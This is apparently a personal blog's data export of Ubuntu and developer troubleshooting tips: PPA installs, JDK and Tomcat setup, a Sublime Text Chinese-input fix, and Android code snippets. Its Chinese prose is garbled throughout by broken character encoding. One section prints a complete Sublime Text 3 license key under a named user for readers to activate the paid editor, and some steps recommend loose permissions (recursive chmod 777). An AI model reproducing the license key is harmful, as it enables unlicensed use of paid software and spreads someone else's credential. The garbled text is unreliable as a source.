ç½‘é€Ÿæ˜¾ç¤ºæ’ä»¶\n\n```\nsudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor  \nsudo apt-get update\nsudo apt-get install indicator-sysmonitor\nindicator-sysmonitor &\nç„¶åCtrl+Cå°±å¯ä»¥å®ç°åå°è¿è¡Œindicator-sysmonitor\n```\n\n#### å®‰è£… syspeek\n\n```\nsudo add-apt-repository ppa:nilarimogard/webupd8    \nsudo apt-get update    \nsudo apt-get install syspeek\n```\n\n#### å®‰è£… Flash æ’ä»¶\n\nè¿›å…¥ç³»ç»Ÿè®¾ç½® --> è½¯ä»¶ä¸æ›´æ–° --> å…¶ä»–è½¯ä»¶ --> å‹¾ä¸ŠCanonicalåˆä½œä¼™ä¼´ --> ç¡®å®š  \nè¿›å…¥ç»ˆç«¯ï¼š`apt-get install adobe-flashplugin`\n\n#### å®‰è£…ä¸ºçŸ¥ç¬”è®°\n\n```\nsudo add-apt-repository ppa:wiznote-team\nsudo apt-get update\nsudo apt-get install wiznote\n```\n\n#### å®‰è£…remarkable markdownç¼–è¾‘å™¨\n\nä¸‹è½½å®‰è£…åŒ…\nhttp://remarkableapp.github.io/linux/download.html\n\n- `dpkg -i remarkable_1.62_all.deb`\n- `sudo apt-get install -f`\n  å¦‚æœæŠ¥è­¦è¯´å°‘äº† gtkspellcheckï¼š  \n  `sudo apt-get install python3-gtkspellcheck`\n\n#### å®‰è£… Sublime Text 3\n\n```\nsudo add-apt-repository ppa:webupd8team/sublime-text-3  \nsudo apt-get update  \nsudo apt-get install sublime-text-installer\n```\n\nè£…å®Œäº†ä»¥åå¯ä»¥æ¿€æ´»å®ƒï¼Œåœ¨Helpé‡Œè¾“å…¥license key\n\n```\nâ€”â€“ BEGIN LICENSE â€”â€“\nMichael Barnes\nSingle User License\nEA7E-821385\n8A353C41 872A0D5C DF9B2950 AFF6F667\nC458EA6D 8EA3C286 98D1D650 131A97AB\nAA919AEC EF20E143 B361B1E7 4C8B7F04\nB085E65E 2F5F5360 8489D422 FB8FC1AA\n93F6323C FD7F7544 3F39C318 D95E6480\nFCCC7561 8A4A1741 68FA4223 ADCEDE07\n200C25BE DBBC4855 C4CFB774 C5EC138C\n0FEC1CEF D9DCECEC D3A5DAD1 01316C36\nâ€”â€” END LICENSE â€”â€”\n```\n\ncontrol+shift+på®‰è£…package control\n\n#### å®‰è£… Atom ç¼–è¾‘å™¨\n\n```\nsudo add-apt-repository ppa:webupd8team/atom  \nsudo apt-get update  \nsudo apt-get install atom\n```\n\n#### å…³äºæç¤º â€œå½“å‰ç½‘ç»œæœ‰localåŸŸâ€\n\nä¿®æ”¹/etc/default/avahi-daemon ä¸­å‚æ•°  \nAVAHI_DAEMON_DETECT_LOCAL=0\n\n#### â€œæ­¤è½¯ä»¶æ¥è‡ªç¬¬ä¸‰æ–¹ä¸”å¯èƒ½åŒ…å«éè‡ªç”±ç»„ä»¶â€ çš„é—®é¢˜\n\nUbuntu16.04 LTSå®‰è£…ç¬¬ä¸‰æ–¹è½¯ä»¶ `*.deb` æ—¶ï¼Œ æç¤ºæ­¤è½¯ä»¶æ¥è‡ªç¬¬ä¸‰æ–¹ä¸”å¯èƒ½åŒ…å«éè‡ªç”±ç»„ä»¶çš„åœ¨Ubuntuè½¯ä»¶ä¸­å¿ƒå®‰è£…GDebiï¼Œç„¶åå³é”®å•å‡» `*.deb` å®‰è£…åŒ…ï¼Œæ‰“å¼€æ–¹å¼é€‰æ‹©â€GDebiåŒ…å®‰è£…ç¨‹åºâ€ï¼Œæœ€ååœ¨æœºå™¨ä¸Š sudo apt install `*.deb` å°±ok\n\n#### ç«ç‹æµè§ˆå™¨è®¾ç½®å¯¹æ‰€æœ‰é¡µé¢ç¼©æ”¾\n\n1. åœ°å€æ è¾“å…¥ about:config\n2. æ‰¾ layout.css.devPixelsPerPs\n3. ä¿®æ”¹æ•°å€¼ 1.25ï¼Œæ„æ€å°±æ˜¯ 125%\n\n#### è®¾ç½®å¤–ç½®ç£ç›˜å¼€æœºè‡ªåŠ¨æŒ‚è½½\n\n1. `sudo blkid` æŸ¥çœ‹ç£ç›˜åˆ†åŒº UUID\n2. `vim /etc/fstab` i è¿›å…¥ç¼–è¾‘æ¨¡å¼\n3. æœ€åä¸€è¡Œæ·»åŠ  `UUID=xxxxx  æŒ‚è½½ç‚¹ ext4 auto 0 0`\n\n#### è®¾ç½®å¯åŠ¨å™¨ä½ç½®\n\nå¯åŠ¨å™¨ä½äºä¸‹æ–¹\n`gsettings set com.canonical.Unity.Launcher launcher-position Bottom`  \nå¯åŠ¨å™¨ä½äºå·¦ä¾§\n`gsettings set com.canonical.Unity.Launcher launcher-position Left`\n\n#### ç¦ç”¨å®¢äººä¼šè¯\n\n`sudo gedit /etc/lightdm/lightdm.conf`  \næ·»åŠ å¦‚ä¸‹ä»£ç ï¼Œç„¶åä¿æŒé‡å¯ç”µè„‘å³å¯ã€‚\n\n```\n[SeatDefaults]\ngreeter-session=unity-greeter\nallow-guest=false\n```\n\n#### ibus æ‹¼éŸ³è¾“å…¥æ³•\n\nå®‰è£…ï¼š`sudo apt-get install ibus-pinyin`  \næ— æ³•æ­£å¸¸è¾“å…¥ï¼š`ibus-daemon -drx`\n\n#### å®‰è£… WPS åå­—ä½“ç¼ºå¤±\n\n1. ä¸‹è½½ï¼š`wps_symbol_fonts.zip`\n2. åˆ›å»ºç›®å½•ï¼š`sudo mkdir /usr/share/fonts/wps-office`\n3. å°†ä¸‹è½½çš„å­—ä½“å¤åˆ¶åˆ°åˆ›å»ºçš„ç›®å½•ï¼š`sudo cp -r wps_symbol_fonts.zip /usr/share/fonts/wps-office`\n4. è§£å‹å­—ä½“åŒ…ï¼š`sudo unzip wps_symbol_fonts.zip`\n5. è§£å‹ååˆ é™¤å­—ä½“åŒ…ï¼š`sudo rm -r wps_symbol_fonts.zip`\n   ps:å®‰è£… wps å»[è‹±æ–‡å®˜ç½‘](www.wps.com)ä¸‹è½½ï¼ˆæ›´æ–°æ›´å¿«ï¼‰\n\n#### AS æŠ¥é”™ unable to sun mksdcard\n\nAndroid Studio æŠ¥é”™ unable to run mksdcard sdk tool  \næ‰“å¼€ç»ˆç«¯è¾“å…¥`sudo apt-get install lib32stdc++6`\n\n#### ç¦»çº¿å®‰è£…åŒ…å®‰è£…å’Œé…ç½®JDK\n\n```\nsudo su\nmkdir /usr/java\ncp /home/gray/Downloads/xxx.tar.gz /usr/java\ntar -zxvf xxx.tar.gz\nvim /etc/profile\ni (editing mode)\n//æœ«å°¾æ·»åŠ \nexport JAVA_HOME=/usr/java/jdk1.x.xx\nexport PATH=$JAVA_HOME/bin:$PATH\nesc //é€€å‡ºç¼–è¾‘æ¨¡å¼\n:wq! //ä¿å­˜å¹¶é€€å‡º\n```\n\n#### å®‰è£… tomcat\n\n1. ä¸‹è½½tar.gzå®‰è£…åŒ…ï¼Œè§£å‹åˆ°æƒ³å®‰è£…çš„ä½ç½®å¼€å§‹é…ç½®\n2. `vim /etc/profile æ·»åŠ `\n3. `export CATALINA_HOME=è§£å‹çš„ä½ç½®`\n4. è¿›å…¥tomcat binç›®å½•\n5. `vim catalina.sh`\n6. æ‰¾åˆ°è¿™è¡Œ# OS specific support. $var _must_ be set to either true or false.\n7. åœ¨è¿™è¡Œä¸‹é¢æ–°å¢å¦‚ä¸‹é…ç½®è¯­å¥\n   `CATALINA_HOME=...`\n   `JAVA_HOME=...`\n8. å®‰è£…tomcatæœåŠ¡\n9. `cp catalina.sh /etc/init.d/tomcat`\n10. å¯åŠ¨å’Œå…³é—­tomcat\n11. `service tomcat startï¼ˆstopï¼‰`\n\n#### å®‰è£… MySql\n\n1. `sudo apt-get install mysql-server mysql-client`\n2. Eclipseæ·»åŠ tomcatæ—¶æ˜¾ç¤º tomcat unknown version of tomcat was specified\n3. å› ä¸ºé…ç½®tomcatéœ€è¦è®¿é—®tomcatç›®å½•ä¸‹çš„libåº“ã€‚\n   é€šè¿‡å¦‚ä¸‹å‘½ä»¤ï¼š\n   `chmod -R 777 apache-tomcat-xxx/lib`\n   Eclipseæ— æ³•æ–°å»ºæœåŠ¡å™¨æ—¶éœ€è¦è·å¾—tomcatç›®å½•æ‰§è¡Œæƒé™\n   `sudo chmod 777 tomcatdir -R`\n\n#### æ·»åŠ å¿«æ·æ–¹å¼ï¼ˆIntellij-IDEAä¸ºä¾‹ï¼‰\n\n- `sudo vim /usr/share/applications/intellij-idea.desktop`\n\n```\n[Desktop Entry]\nName=IntelliJ IDEA\nExec=/home/xring/Tools/idea-IU-141.1532.4/bin/idea.sh\nComment=IntelliJ IDEA\nIcon=/home/xring/Tools/idea-IU-141.1532.4/bin/idea.png\nType=Application\nTerminal=false\nEncoding=UTF-8\n```\n\n- `sudo chmod +x /usr/share/applications/intellij-idea.desktop`\n\n#### eclipse åˆ›å»º AVD æ¨¡æ‹Ÿå™¨æŠ¥é”™ failed to create the sd card\n\nä¸¤ç§æƒ…å†µï¼š\n\n1. è®¾ç½®android sdkä¸‹çš„toolsæƒé™ä¸ºå¯æ‰§è¡Œæƒé™ã€‚`Chmod +x toolsç›®å½•`\n2. æ²¡æœ‰å®‰è£…ia32-libs  \n   1)ï¼Œåœ¨ç”¨çš„æ¶æ„:\n   `dpkg --print-architecture`\n   è¾“å‡ºå½“å‰çš„ä½¿ç”¨çš„æ¶æ„ï¼Œæ¯”å¦‚amd64  \n   2)ï¼Œæ·»åŠ æ¶æ„\n   `dpkg --add-architecture i386`\n   æ·»åŠ i386æ¶æ„ï¼Œç„¶ååˆ·æ–°ä¸‹æºåˆ—è¡¨ï¼Œå½“ç„¶ï¼Œåˆ é™¤å°±æ˜¯remove\n   `apt-get update`\n   è¿™æ—¶å°±å·²ç»åŒ…å«i386çš„è½¯ä»¶åˆ—è¡¨  \n   3)ï¼Œå®‰è£…i386è½¯ä»¶\n   `apt-get install iceweasel:i386`","tags":["tips","Ubuntu"]},{"title":"è§£å†³çš„é—®é¢˜","url":"/2018/02/25/solved-problems/","content":"\n\n::: danger\n\nå·²ç»ä¸å†æ›´æ–°\n\n:::\n\næˆ‘ä¼šæŠŠå¹³æ—¶é‡åˆ°å¹¶ä¸”æˆåŠŸè§£å†³çš„ä¸€äº›å°é—®é¢˜å†™åœ¨è¿™é‡Œã€‚\n\n## Ubuntu è®¾ç½® python3 ä¸ºé»˜è®¤\n`sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 100` \n\n`sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 150`\n\nå¦‚æœè¦åˆ‡æ¢å› python2 \n\n`sudo update-alternatives --config python` \n\næ ¹æ®æç¤ºè¾“å…¥é€‰æ‹©æ•°å­—å›è½¦å³å¯ã€‚\n\n## Ubuntu å¼€æœºæ˜¾ç¤ºæ‚¨çš„ç½‘ç»œæœ‰ .local åŸŸ\nç”¨ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨ï¼ˆvim æˆ– geditç­‰ï¼‰å°† /etc/default/avahi-daemon æ–‡ä»¶ä¸­çš„å‚æ•°æ”¹ä¸º AVAHI_DAEMON_DETECT_LOCAL=0 å³å¯ã€‚ï¼ˆåŸæ¥ç­‰äº 1ï¼‰\n\n## Ubuntu ä¼˜åŒ–åŠ é€Ÿ\nä½¿ç”¨ man systemd-analyze æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹  \nå‘ç°ç¦ç”¨å ç”¨æ—¶é—´æœ€é•¿çš„ NetworkManager-wait-online.service  \nä½¿ç”¨å‘½ä»¤ `sudo systemctl disable NetworkManager-wait-online.service` ç¦æ­¢å¯åŠ¨  \nè®¾ç½® vm.swappiness=10\n1.æ‰“å¼€ç»ˆç«¯ï¼ŒæŸ¥çœ‹äº¤æ¢å‚æ•°çš„å€¼å¤§å°ï¼Œè¾“å…¥å‘½ä»¤:  \n`cat /proc/sys/vm/swappiness`  \nä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä¸´æ—¶å°†äº¤æ¢å‚æ•°æ”¹ä¸º10ï¼Œé‡å¯ä¹‹åä»ä¼šæ¢å¤åŸçŠ¶ï¼Œå˜ä¸º60:  \n`sudo sysctl vm.swappiness=10`  \næ°¸ä¹…çš„æ”¹å˜è¯¥å‚æ•°ï¼Œç”¨ä¸‹åˆ—å‘½ä»¤:\n`gksudo gedit /etc/sysctl.conf`\næœç´¢å…³é”®å­— â€œvm.swappinessâ€ï¼ˆæ— å¼•å·ï¼‰ï¼Œæ”¹æˆä½ æ„¿æ„çš„å€¼ã€‚å¦‚æœ vm.swappiness ä¸å­˜åœ¨ï¼Œå¯åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ :\n`vm.swappiness=10`ï¼Œå®Œæ¯•ï¼Œä¿å­˜æ–‡ä»¶ï¼Œé‡å¯å³å¯ã€‚  \n\nPreload æ˜¯ä¸€ä¸ªè¿è¡Œäºåå°çš„ç›‘æŠ¤ç¨‹åºï¼Œæ¢æµ‹é‚£äº›å¸¸ç”¨çš„è½¯ä»¶ï¼Œå¹¶å°†å…¶æ”¾å…¥ç¼“å­˜ï¼Œä»¥èµ·åˆ°åŠ é€Ÿçš„ä½œç”¨ã€‚  \nåœ¨LinuxMint/Ubuntuä¸‹å®‰è£…Preloadå¾ˆç®€å•ï¼š  \n`sudo apt-get install preload`  \nPreload é»˜è®¤çš„é…ç½®å¯¹äºæ™®é€šç”¨æˆ·è€Œè¨€å·²ç»ä¸é”™äº†ï¼Œä¸€èˆ¬ä¸éœ€è¦ä¿®æ”¹ã€‚å¦‚æœæœ‰è¿›ä¸€æ­¥æŒæ§å…¶çš„æ¬²æœ›ï¼Œå¯ä»¥æ‰“å¼€å…¶é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼š  \n`sudo gedit /etc/preload.conf`\n\n## chrome é•¿æˆªå›¾\nè¿›å…¥å¼€å‘è€…æ¨¡å¼(f12)ï¼Œctrl + shift + p è¾“å…¥ capture full size screenshot å³å¯ã€‚\næ¨¡æ‹Ÿç§»åŠ¨æ–­åˆ™ä½¿ç”¨ ctrl + shift + mã€‚\n\n## è§£å†³ Windows ç”Ÿæˆçš„ zip æ–‡ä»¶åœ¨ Ubuntu ä¹±ç é—®é¢˜\nä½¿ç”¨ -O å‘½ä»¤æŒ‡å®šå­—ç¬¦é›†ï¼ˆGBKã€GB18030ã€CP936ï¼‰è§£å‹\n```\nunzip -O GBK zip_name.zip\n```\n\n## ä¿®æ”¹ Ubuntu å®¶ç›®å½•ä¸‹çš„ç»“æ„\n```\ncd ~/.config/\nvim user-dirs.dirs\n```\n\n## Ubuntu tty æ¨¡å¼è°ƒæ•´å­—ä½“\nä¸€æ¡å‘½ä»¤å³å¯ï¼Œæ ¹æ®æç¤ºä¿®æ”¹å­—ä½“å¤§å°\n```\nsudo dpkg-reconfigure console-setup\n```\n\n## Anaconda ä¿®æ”¹ç¯å¢ƒåç§°\nAnaconda æ²¡æœ‰ç›¸å…³å‘½ä»¤å¯ä»¥ç›´æ¥ä¿®æ”¹ç¯å¢ƒåç§°ï¼Œè¿™é‡Œåªèƒ½å…ˆå…‹éš†ç¯å¢ƒå†å°†åŸç¯å¢ƒåˆ é™¤ã€‚\n```\nconda create --name new_name --clone old_name\nconda remove --name old_name --all\n```\n## Ubuntu æ¸…ç†æ—¥å¿—æ–‡ä»¶\nä½¿ç”¨ ncdu å·¥å…·æ¥æŸ¥çœ‹å¤§æ—¥å¿—æ–‡ä»¶\n```bash\nsudo apt install ncdu\nsudo ncdu /var/log\n# ä¾‹å¦‚è¦åˆ é™¤ mail.log æ—¥å¿—\nsudo dd if=/dev/null of=/var/log/mail.log\n```\n\n## å¸è½½ä½¿ç”¨ \"python setup.py install\" å‘½ä»¤å®‰è£…çš„åŒ…\nè¿›å…¥åŒ…å« `setup.py` çš„ç›®å½•\n```bash\n# å®‰è£…çš„æ—¶å€™\npython setup.py install --record log\n# è¿™æ—¶å€™å®‰è£…ç»†èŠ‚éƒ½å†™åœ¨ log æ–‡ä»¶é‡Œäº†\n# æƒ³è¦å¸è½½çš„æ—¶å€™\ncat log | xargs rm -rf\n```\n\n## åˆ é™¤ Ubuntu å¤šä½™å†…æ ¸\nä½¿ç”¨å‘½ä»¤æŸ¥çœ‹å½“å‰å†…æ ¸  \n`uname -a`  \næŸ¥çœ‹æ‰€æœ‰å†…æ ¸  \n`dpkg --get-selections | grep linux`  \nåˆ é™¤ `linux-image(headers)-xxxxxx-generic`  \n`sudo apt-get remove linux-image-2.6.32-22-generic`\n\n## Ubuntu ä½¿ç”¨ deborphan å‘½ä»¤åˆ é™¤å­¤å„¿è½¯ä»¶åŒ…\nåœ¨ ubuntu ä¸­ä½¿ç”¨ apt å®‰è£…ä¸€ä¸ªè½¯ä»¶åŒ…æ—¶ä¼šè‡ªåŠ¨å®‰è£…å…¶ä»–ä¾èµ–ï¼Œåˆ é™¤æ‰è¿™ä¸ªè½¯ä»¶åŒ…æ—¶ï¼Œè¿™äº›ä¾èµ–ä¹Ÿå°±æ²¡æœ‰ç”¨å¤„äº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ é™¤ï¼š  \n`sudo apt autoremove`  \nä¸è¿‡ `autoremove` åªä¼šåˆ é™¤ç»è¿‡ `apt` è‡ªåŠ¨å®‰è£…çš„ä¾èµ–ï¼Œè€Œè‡ªå·±æ‰‹åŠ¨å®‰è£…çš„ä¾èµ–åˆ™ä¸ä¼šè¢«åˆ é™¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `deborphan` æ¥å½»åº•åˆ é™¤ï¼š\n```bash\n# åˆ—å‡ºå­¤å„¿è½¯ä»¶åŒ…\ndeborphan\n# å°†ä»–ä»¬åˆ é™¤\ndeborphan | xargs sudo apt purge -y\n```\n\n## Microsoft Word 2016 æ— æ³•æ­£å¸¸æ’¤é”€\nç”µè„‘å®‰è£… Word 2016 åï¼Œæœ‰æ—¶å€™ä¼šé‡åˆ°æ’¤é”€åŠŸèƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ— è®ºæ˜¯ä½¿ç”¨ä¸Šæ–¹çš„æŒ‰é’®è¿˜æ˜¯ä½¿ç”¨ ctrl+z å¿«æ·é”®éƒ½ä¸è¡Œï¼ŒæŒ‰é’®å§‹ç»ˆæ˜¯ç°è‰²çš„ï¼Œæˆ–è€…ç‚¹ä¸€ä¸‹å°±å˜ç°äº†ã€‚  \nå»ç½‘ä¸ŠæŸ¥äº†æŸ¥ï¼Œä¸»è¦æœ‰ä»¥ä¸Šå‡ ç§è§£å†³åŠæ³•\n- é‡è£…office\n- æ›´æ¢è¾“å…¥æ³•ï¼ˆMicrosoft å®˜æ–¹æ¨èï¼Œç„¶è€Œå¥½åƒå¹¶ä¸ç®¡ç”¨ï¼‰\n- ä¿®æ”¹æ³¨å†Œè¡¨ï¼ˆç½‘å‹è¯´æœ‰äº‹æ—¶å¥½æ—¶åï¼‰  \n\næˆ‘æ˜¯ç”¨ç¬¬ä¸‰ç§æ–¹æ³•è§£å†³çš„ã€‚\n1. win+R è¾“å…¥ regedit è¿›å…¥æ³¨å†Œè¡¨ç¼–è¾‘å™¨\n2. æ‰¾åˆ° HKEY_CURRENT_USER/Software/Microsoft/Office/15.0/Word/Options\n3. æ–°å»º DWORD å€¼ï¼Œåä¸º UndoHistoryï¼ŒåŒå‡»ä¿®æ”¹å®ƒçš„å€¼ä¸º **åè¿›åˆ¶ 0~100** çš„æ•°ï¼ˆæˆ‘å¡«çš„100ï¼‰\n4. å¦‚ä¸‹å›¾æ‰€ç¤º  \n![å›¾ç¤º](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804194050.png)\nå¦å¤–è¿™é‡Œæ˜¯æˆ‘çš„è¿è¡Œç¯å¢ƒ\n- Windows 10 ä¸“ä¸šç‰ˆ 1703\n- OS ç‰ˆæœ¬ï¼š15063.413\n- Officeç‰ˆæœ¬ï¼š2016ä¸“ä¸šç‰ˆ\n\n## ç»™ AppCompatActivity çš„æ ‡é¢˜æ åŠ ä¸Šè¿”å›æŒ‰é’®\nåœ¨ Activity çš„ onCreate æ–¹æ³•ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç \n```Java\nandroid.support.v7.app.ActionBar actionBar = getSupportBar();\nif (actionBar != null) {\n  actionBar.setHomeButtonEnabled(true);\n  actionBar.setDisplayHomeAsUpEnabled(true);\n}\n```\nåœ¨ onOptionsItemSelected ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç \n```Java\n@Override\npublic boolean onOptionsItemSelected(MenuItem item) {\n  switch (item.getItemId()) {\n    case android.R.id.home :\n    this.finish();\n    return true;\n  }\n  return super.onOptionsItemSelected(item);\n}\n```\nè¿è¡Œæ•ˆæœå¦‚ä¸‹  \n![è¿è¡Œæ•ˆæœ](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804194108.png)\n\n## éšè— AppCompatActivity çš„æ ‡é¢˜æ \nåœ¨ Android Studio æ–°å»º Activityï¼Œå¦‚æœç»§æ‰¿è‡ª AppCompatActivity\nä½¿ç”¨ `requestWindowFeature(Window.FEATURE_NO_TITLE);`  \næ˜¯æ²¡æœ‰åŠæ³•éšè—æ ‡é¢˜æ çš„ã€‚  \nè§£å†³æ–¹æ¡ˆï¼š\n- ä¸ç»§æ‰¿ AppCompatActivity  \næˆ–è€…\n- åœ¨ setContentView æ–¹æ³•åæ·»åŠ ä¸€å¥:  \n  `getSupportActionBar().hide();`\n\n## Android Studio å¯¼å…¥é¡¹ç›®çš„æ­£ç¡®æ­¥éª¤\n1. æ‰“å¼€ Project ä¸­çš„ build.gradle, ä¿®æ”¹ dependicies ä¸ºè‡ªå·±æœ¬åœ°çš„ç‰ˆæœ¬\n2. æ‰“å¼€ Project ä¸­ gradle-wrapper.properties, å°† distributionUrlä¿®æ”¹ä¸ºè‡ªå·±æœ¬åœ°çš„ç‰ˆæœ¬\n3. æ‰“å¼€ app ä¸­çš„ build.gradle, ä¿®æ”¹ compileSdkVersion å’Œ buildToolsVersion ä¸ºè‡ªå·±æœ¬åœ°çš„ç‰ˆæœ¬\n\n## Ubuntu ä¸‹ Sublime Text 3 æ— æ³•è¾“å…¥ä¸­æ–‡\nä¿å­˜ä¸‹é¢çš„ä»£ç åˆ°æ–‡ä»¶sublime_imfix.c(ä½äº~ç›®å½•)\n``` c\n#include <gtk/gtkimcontext.h>\nvoid gtk_im_context_set_client_window (GtkIMContext *context,\n         GdkWindow    *window)\n{\n GtkIMContextClass *klass;\n g_return_if_fail (GTK_IS_IM_CONTEXT (context));\n klass = GTK_IM_CONTEXT_GET_CLASS (context);\n if (klass->set_client_window)\n   klass->set_client_window (context, window);\n g_object_set_data(G_OBJECT(context),\"window\",window);\n if(!GDK_IS_WINDOW (window))\n   return;\n int width = gdk_window_get_width(window);\n int height = gdk_window_get_height(window);\n if(width != 0 && height !=0)\n   gtk_im_context_focus_in(context);\n}\n```\nå°†ä¸Šä¸€æ­¥çš„ä»£ç ç¼–è¯‘æˆå…±äº«åº“libsublime-imfix.soï¼Œå‘½ä»¤  \n`gcc -shared -o libsublime-imfix.so sublime_imfix.c  pkg-config --libs --cflags gtk+-2.0 -fPIC`  \nå¦‚æœæç¤º gtk/gtkimcontext.hï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•ï¼Œé‚£å°±æ˜¯æ²¡æœ‰ç›¸å…³çš„ä¾èµ–è½¯ä»¶ï¼Œå®‰è£…å‘½ä»¤ï¼š  \n`sudo apt-get install build-essential libgtk2.0-dev`  \nç„¶åå°†libsublime-imfix.soæ‹·è´åˆ°sublime_textæ‰€åœ¨æ–‡ä»¶å¤¹  \n`sudo mv libsublime-imfix.so /opt/sublime_text/`  \nä¿®æ”¹æ–‡ä»¶/usr/bin/sublçš„å†…å®¹  \n`sudo gedit /usr/bin/subl`  \nå°†  \n`#!/bin/sh`  \n`exec /opt/sublime_text/sublime_text \"$@\"`  \nä¿®æ”¹ä¸º  \n`#!/bin/sh`  \n`LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text \"$@\"`  \næ­¤æ—¶ï¼Œåœ¨å‘½ä»¤ä¸­æ‰§è¡Œ subl å°†å¯ä»¥ä½¿ç”¨æœç‹—for linuxçš„ä¸­æ–‡è¾“å…¥\nä¸ºäº†ä½¿ç”¨é¼ æ ‡å³é”®æ‰“å¼€æ–‡ä»¶æ—¶èƒ½å¤Ÿä½¿ç”¨ä¸­æ–‡è¾“å…¥ï¼Œè¿˜éœ€è¦ä¿®æ”¹æ–‡ä»¶ sublime_text.desktop çš„å†…å®¹ã€‚  \n`sudo gedit /usr/share/applications/sublime_text.desktop`  \nå°†[Desktop Entry]ä¸­çš„å­—ç¬¦ä¸²  \n`Exec=/opt/sublime_text/sublime_text %F`  \nä¿®æ”¹ä¸º  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text %F\"`  \nå°†[Desktop Action Window]ä¸­çš„å­—ç¬¦ä¸²  \n`Exec=/opt/sublime_text/sublime_text -n`  \nä¿®æ”¹ä¸º  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text -n\"`  \nå°†[Desktop Action Document]ä¸­çš„å­—ç¬¦ä¸²  \n`Exec=/opt/sublime_text/sublime_text --command new_file`  \nä¿®æ”¹ä¸º  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text --command new_file\"`  \næ³¨æ„ï¼šä¿®æ”¹æ—¶è¯·æ³¨æ„åŒå¼•å·\"\",å¦åˆ™ä¼šå¯¼è‡´ä¸èƒ½æ‰“å¼€å¸¦æœ‰ç©ºæ ¼æ–‡ä»¶åçš„æ–‡ä»¶ã€‚\næ­¤å¤„ä»…ä¿®æ”¹äº† /usr/share/applications/sublime-text.desktopï¼Œä½†å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚/opt/sublime_text/ç›®å½•ä¸‹çš„ sublime-text.desktop å¯ä»¥ä¿®æ”¹ï¼Œä¹Ÿå¯ä¸ä¿®æ”¹ã€‚\n\n## æ¸…é™¤ ubuntu å¸è½½è½¯ä»¶åæ®‹ç•™çš„å¿«æ·æ–¹å¼\n1. å°† `/usr/share/applications/` ç›®å½•ä¸‹çš„ xxx.desktop åˆ é™¤\n2. å°† `~/.local/share/applications/` ç›®å½•ä¸‹çš„ç›¸å…³æ–‡ä»¶åˆ é™¤\n3. å°† `~/.config/menus/applications-merged/` ç›®å½•ä¸‹ç›¸å…³çš„æ–‡ä»¶åˆ é™¤\n\n## ä½¿ç”¨ VSCode è¿è¡Œ JavaScript\n1. æ–°å»ºç›®å½•ï¼Œå½“ä½œ JavaScript çš„ WorkSpaceï¼Œè¿›å…¥è¯¥ç›®å½•\n2. æ–°å»º .vscode æ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸‹æ–°å»º tasks.json æ–‡ä»¶\n3. å‘è¯¥ json æ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹\n\n```json\n{\n    \"version\": \"0.1.0\",\n    \"command\": \"node\",\n    \"isShellCommand\": true,\n    \"args\": [\n        \"${file}\"\n    ],\n    \"showOutput\": \"always\"\n}\n```\nè¿è¡Œ JavaScript æ–‡ä»¶ï¼š ctrl+shift+b\n\n## åœ¨ Win 10 ä¸­ä½¿ç”¨ mysql-installer å®‰è£… MySQL\nåœ¨ Win10 ä¸­ä½¿ç”¨ installer å®‰è£… MySQL çš„æ—¶å€™ä¼šå› ä¸ºç¼ºå°‘ VC++ 2013 åº“æç¤ºå®‰è£… VC++2013ï¼ˆX64ï¼‰ï¼Œå®‰è£…å®Œæˆåå®‰è£… MySQL å´æŠ¥é”™ install failedï¼Œæç¤ºç¼ºå°‘ VC++ 2013ï¼Œåˆšå®‰è£…çš„æ€ä¹ˆä¼šæ²¡æœ‰å‘¢ï¼Œè¿™ä¸ªé—®é¢˜å›°æ‰°äº†æˆ‘å¥½ä¹…ï¼Œç»ˆäºåœ¨ä»Šå¤©æ‰¾åˆ°äº†[è§£å†³æ–¹æ¡ˆ](https://stackoverflow.com/questions/45163588/mysql-5-7-installer-fails-to-detect-vs-2013-redistributable/45165995)  \nå¤§æ¦‚æ˜¯å› ä¸ºå®‰è£…ç¨‹åºæ‰€éœ€è¦çš„ VC++2013 æ˜¯ 32 ä½çš„å§ï¼ŒæŠŠ 32 ä½çš„ VC++2013 ä¹Ÿå®‰è£…ä¸Šå°±å¥½äº†ã€‚\n\n## è®¾ç½® Eclipse çš„ç¼–ç æ ¼å¼\neclipse åœ¨ windows ä¸‹é»˜è®¤çš„ç¼–ç ä¸º GBKï¼Œè€Œå¸¸ç”¨çš„æ ¼å¼ä¸º UTF-8ï¼Œæ‰€ä»¥ç¨å¾®ä¸æ³¨æ„å°±ä¼šå‡ºç°ä¹±ç æƒ…å†µï¼Œä¸‹é¢æ¥ä¿®æ”¹ eclipse é»˜è®¤çš„ç¼–ç æ ¼å¼ã€‚  \n1. æ‰“å¼€ eclipse è®¾ç½®ï¼Œåœ¨ general ä¸­æ‰¾åˆ° workspaceï¼Œå°†ä¸‹é¢çš„ text file coding ä¿®æ”¹ä¸º UTF-8ã€‚\n2. åœ¨è®¾ç½®ä¸­æœç´¢ content typesï¼Œç‚¹å‡»å³ä¾§çš„ textï¼Œåœ¨ä¸‹é¢çš„ default coding æ¡†ä¸­å¡«ä¸Š 